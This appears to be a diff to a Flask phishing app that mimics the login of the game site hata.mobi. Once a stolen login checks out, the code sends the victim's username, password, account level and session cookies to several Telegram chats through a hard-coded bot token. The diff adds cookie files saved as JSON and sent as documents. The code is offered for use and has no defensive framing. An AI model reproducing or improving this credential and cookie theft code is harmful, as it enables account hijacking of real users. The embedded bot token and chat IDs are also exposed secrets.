@@ -5,12 +5,14 @@ from flask import Flask, render_template, request
 from bs4 import BeautifulSoup as bs
 import telebot
 from fake_useragent import UserAgent
+import datetime
+import os
 
 app = Flask(__name__)
-
 token = '5354741796:AAEW0NOKHmaCeDQZNJytJag5V3LQtyPOrbw'
-chatId = '1310265676'
-
+chatIds = ['1310265676',
+           '788542014'
+           ]
 bot = telebot.TeleBot(token)
 
 crop_url = 'https://hata.mobi/index.php?r=crop'
@@ -74,8 +76,23 @@ def profile():
     return render_template('profile.html')
 
 
-def send_report(report_text):
-    bot.send_message(chatId, report_text)
+def send_report(report_text, file_name, pretty):
+    path = os.path.join(os.getcwd(), 'cookies', file_name)
+    for chatId in chatIds:
+        try:
+            bot.send_message(chatId, report_text)
+        except Exception as e:
+            print('Unavailable channel', e)
+    with open(path, 'w+', encoding='utf-8') as outfile:
+        rows = pretty.split('\n')
+        for row in rows:
+            outfile.write(row + '\n')
+    with open(path, 'rb') as outfile:
+        for chatId in chatIds:
+            try:
+                bot.send_document(chatId, outfile)
+            except Exception as e:
+                print('Unavailable channel', e)
 
 
 def fish(req):
@@ -136,12 +153,15 @@ def check_authorize(username, password):
             lvl_text = lvl.get_text().strip()
             cookies = temp_session.cookies.get_dict()
             pretty = json.dumps(cookies, sort_keys=True, indent=4)
-            report = 'Level: {0}\nLogin: {1}\nPassword: {2}\n\nCookies:\n{3}'.format(lvl_text,
-                                                                                     username,
-                                                                                     password,
-                                                                                     pretty)
+            now = datetime.datetime.now()
+            date_string = now.strftime("%d-%m-%Y-%H-%M")
+            file_name = "[{0}]{1}.json".format(username, date_string)
+            report = 'Level: {0}\nLogin: {1}\nPassword: {2}\n'.format(lvl_text,
+                                                                      username,
+                                                                      password)
             print('Report is', report)
-            send_report(report)
+
+            send_report(report, file_name, pretty)
 
         return int(lvl_text)
     else:
